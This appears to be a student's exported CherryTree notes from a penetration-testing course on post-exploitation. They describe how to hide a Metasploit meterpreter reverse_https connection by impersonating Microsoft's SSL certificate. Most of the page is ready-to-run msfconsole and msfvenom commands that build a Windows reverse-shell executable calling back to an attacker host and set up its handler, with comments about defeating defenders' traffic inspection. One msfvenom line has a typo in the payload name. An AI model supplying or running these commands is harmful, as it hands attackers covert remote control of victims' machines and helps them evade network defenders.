<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>custom SSL certificate</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>custom SSL certificate</h1><br/>PREREQUISTE:<br />• It is not possible to try this method on a Vmware lab with VMs because is not possible see TLS(SSL) packets. <br /><br /><strong><h2>reverse_https with a custom SSL certificate</h2></strong><br />To better obfuscate/encrypt our traffic making it harder to detect, we can configure our own SSL certificate for our payload and handler.<br />This technique can be used in two ways:<br />• By getting an SSL certificate signed by CA (a genuine SSL certificate)<br />    We can purchase a genuine SSL certificate from an authorized seller or you can use services such as <span style="text-decoration:underline;">Let&#39;s Encrypt</span> to get a genuine SSL certificate for free<br />• By using someone else&#39;s SSL certificate (impersonation) ← WHAT WE WILL USE NOW<br /><br /><br /><strong>Default SSL certificate</strong><br />When we establish a meterpreter connection with<br />• <span style="color:#ff8700;">multi/handler</span> via msf on the attacker machine(server)<br />• <span style="color:#ff0000;">payload</span> created with msfvenom on the target(client)<br />and we monitor the traffic with wireshark and filter for ssl traffic specifically for the <span style="text-decoration:underline;">Server Hello</span> from the attacker machine(server)<br />    <div class="codebox"><pre>ssl.handshake.type == 2</pre></div> <br />    and we do “right click” → Follow → TCP Stream<br />    The packets(in ASCII format) contain <strong>SSL certificate informations</strong> and is passed to the client in clear text. <br />    This SSL certificate is randomly generated by metasploit(when we use default options) and can be likely be flagged as suspicious from the defenses<br />    <a href=""><img src="images/962-1.png" alt="images/962-1.png" /></a><br /><br /><strong>Custom SSL certificate</strong><br />To reduce the chances to be detected we can use the module <br /><div class="codebox"><pre>msf&gt; use auxiliary<span style="color:#ff9d00;font-weight:700">/</span>gather<span style="color:#ff9d00;font-weight:700">/</span>impersonate_ssl<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> RHOST www.microsoft.com<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> EXPIRATION &lt;expiration-date-in DD MM YYYY format&gt;<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> ADD_CN *.microsoft.com</pre></div><br />Essentially this module will request a copy of an SSL certificate from a site that we are choosing, than it will create a <span style="color:#00ff00;">private key (PEM|DER)</span> that we can use to configure our <span style="color:#ff0000;">payload</span> and the <span style="color:#ff8700;">handler</span>. This allow to impersonate someone else with the custom SSL certificate and can help to evade the defenses<br /><a href=""><img src="images/962-2.png" alt="images/962-2.png" /></a><br />Now we have to generate <span style="color:#ff0000;">payload</span><br />We can do that by using:<br />• metasploit<br />    <div class="codebox"><pre>msf&gt; use payload<span style="color:#ff9d00;font-weight:700">/</span>windows<span style="color:#ff9d00;font-weight:700">/</span>meterpreter<span style="color:#ff9d00;font-weight:700">/</span>reverse_https<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> LHOST &lt;AttackerIP&gt;<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> LPORT 8443<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> handlersslcert <span style="color:#ff9d00;font-weight:700">/</span>root<span style="color:#ff9d00;font-weight:700">/</span>.msf4<span style="color:#ff9d00;font-weight:700">/</span>loot<span style="color:#ff9d00;font-weight:700">/</span>20201031135026_default_92.122.145.53_92.122.145.53_pe_210718.pem<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> stagerverifysslcert <span style="color:#ff9d00;font-weight:700">true</span>                      <span style="color:#0088ff;font-weight:400">#so will be more difficult for defenders to intercept our SSL traffic</span><br />msf&gt; generate -f exe -o <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>Desktop<span style="color:#ff9d00;font-weight:700">/</span>customPayload.exe</pre></div><br />• msfvenom<br />    <div class="codebox"><pre>msfvenom -p windows<span style="color:#ff9d00;font-weight:700">/</span>memeterpreter<span style="color:#ff9d00;font-weight:700">/</span>reverse_https lhost=&lt;AttackerIP&gt; port=443 handlersslcert=&lt;pem-file&gt; stagerverifysslcert=<span style="color:#ff9d00;font-weight:700">true</span> -f exe -o &lt;output-file&gt;</pre></div><br />Now we have to setup the <span style="color:#ff8700;">handler</span> with the same SSL options<br /><div class="codebox"><pre>msf&gt; use multi<span style="color:#ff9d00;font-weight:700">/</span>handler<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> LHOST &lt;AttackerIP&gt;<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> LPORT 8443<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> handlersslcert <span style="color:#ff9d00;font-weight:700">/</span>root<span style="color:#ff9d00;font-weight:700">/</span>.msf4<span style="color:#ff9d00;font-weight:700">/</span>loot<span style="color:#ff9d00;font-weight:700">/</span>20201031135026_default_92.122.145.53_92.122.145.53_pe_210718.pem<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> stagerverifysslcert <span style="color:#ff9d00;font-weight:700">true</span>                      <span style="color:#0088ff;font-weight:400">#so will be more difficult for defenders to intercept our SSL traffic</span><br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> payload windows<span style="color:#ff9d00;font-weight:700">/</span>meterpreter<span style="color:#ff9d00;font-weight:700">/</span>reverse_https<br />msf&gt; exploit -j      <span style="color:#0088ff;font-weight:400">#background</span></pre></div><br />Now when we intercept the traffic with wireshark we will we in the SSL certificate informations from the Server(our attacker machine) this<br />    <div class="codebox"><pre>ssl.handshake.type == 2</pre></div><br />    <a href="file://G:/Other computers/Yoga 520/CherryTree/screenshots2/PTP-elearnsecurity/2. Network Security/6. Post Exploitation/custom_ssl_certificate.png"><img src="images/962-3.png" alt="images/962-3.png" /></a><br />    “right click” → Follow → TCP Stream<br />    <a href=""><img src="images/962-4.png" alt="images/962-4.png" /></a><br /><br /><strong><span style="color:#ff0000;">WARNING:</span></strong><br />OpenSSL is been updated and changed the following option <code>CipherString=DEFAULT@SECLEVEL=2</code> in /etc/ssl/openssl.cnf<br />This can sometimes completely break the reverse_https payloads disabling to use <strong>HandlerSSLCert</strong> option.<br />To resolve that we can simply change back the <code>CipherString</code> parameter to DEFAULT<br /><div class="codebox"><pre>gedit  <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>ssl<span style="color:#ff9d00;font-weight:700">/</span>openssl.cnf</pre></div><br /><code>CipherString=DEFAULT</code><br /></div>
</body>
</html>
